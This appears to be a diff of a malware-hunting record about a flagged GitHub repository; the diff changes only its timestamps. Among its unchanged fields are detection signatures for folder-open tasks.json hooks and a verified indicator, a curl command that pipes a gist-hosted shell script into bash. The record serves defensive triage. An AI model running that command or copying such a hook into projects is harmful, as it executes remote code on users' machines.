@@ -20,8 +20,8 @@
     "reasons": "Shares a confirmed-malware code signature ['folderOpen curl filename:tasks.json', 'folderOpen powershell filename:tasks.json'] | Tier-2 confirmed (bash score 11)",
     "osm_status": "not_submitted",
     "osm_threat_id": "",
-    "first_seen": "hunt-20260923T001603Z",
-    "last_seen": "hunt-20260923T001603Z",
+    "first_seen": "hunt-20260925T173032Z",
+    "last_seen": "hunt-20260925T173032Z",
     "evidence_file": "repositories/itsmeblackops_wisepanda-bot-main.json",
     "reviewer_decision": "",
     "notes": ""
@@ -89,7 +89,7 @@
     "evidence_references": "https://github.com/itsmeblackops/wisepanda-bot-main/blob/a371fa8c3eb633e0dbd2990c7ba45854c72c3387/.cursor/tasks.json\nhttps://github.com/itsmeblackops/wisepanda-bot-main/blob/a371fa8c3eb633e0dbd2990c7ba45854c72c3387/src/engine/chain/ethereum/hot.py#L7\nhttps://github.com/itsmeblackops/wisepanda-bot-main/blob/a371fa8c3eb633e0dbd2990c7ba45854c72c3387/src/engine/chain/ethereum/hot.py#L13\nhttps://github.com/itsmeblackops/wisepanda-bot-main/blob/a371fa8c3eb633e0dbd2990c7ba45854c72c3387/.venv312/Scripts/pywin32_testall.py#L25\nhttps://github.com/itsmeblackops/wisepanda-bot-main/blob/a371fa8c3eb633e0dbd2990c7ba45854c72c3387/.venv312/Scripts/pywin32_postinstall.py#L222",
     "verified_iocs": "https://gist.githubusercontent.com/cuda-toolkit/0959deda4982736d1c1647cff354c665/raw/metal_pytorch_sim_v2.3.0.sh\ncurl -sL https://gist.githubusercontent.com/cuda-toolkit/0959deda4982736d1c1647cff354c665/raw/metal_pytorch_sim_v2.3.0.sh | bash\n.cursor/tasks.json",
     "contributors": [],
-    "first_seen": "2026-09-23T00:16:03Z",
-    "last_seen": "2026-09-23T00:16:03Z"
+    "first_seen": "2026-09-25T17:30:32Z",
+    "last_seen": "2026-09-25T17:30:32Z"
   }
 }
